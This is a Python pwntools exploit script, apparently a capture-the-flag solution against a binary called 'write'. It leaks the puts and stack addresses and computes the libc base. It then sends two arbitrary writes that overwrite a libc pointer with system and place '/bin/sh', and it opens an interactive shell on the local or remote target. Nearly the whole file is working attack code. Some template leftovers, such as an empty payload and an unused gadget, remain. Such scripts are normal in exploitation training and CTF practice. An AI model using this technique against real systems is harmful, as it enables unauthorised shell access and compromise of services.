#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './write'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x00000000000009e3 # pop rdi ; ret

# elf, libc

# rop1
offset = 0
payload = 'A'*offset
payload += ''

ru('puts: ')
puts = eval(rc(14))
ru('stack: ')
stack = eval(rc(14))

libcbase = puts - libc.sym['puts']
info_addr('libcbase',libcbase)

ptr = libcbase+0x619f60 #0x239f68
info_addr('ptr',ptr)
system = libcbase+libc.sym['system']
info_addr('system',system)
rdi = libcbase+0x619968 #0x239968
info_addr('rdi',rdi)
binsh = libcbase+libc.search('/bin/sh').next()
info_addr('binsh',binsh)

sl('w')
sleep(1)
sl(str(ptr))
sleep(1)
sl(str(system))
sleep(1)

sl('w')
sleep(1)
sl(str(rdi))
sleep(1)
sl(str(u64('/bin/sh\0')))
sleep(1)

debug('b *$rebase(0x969)')
sl('q')
sleep(1)

# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
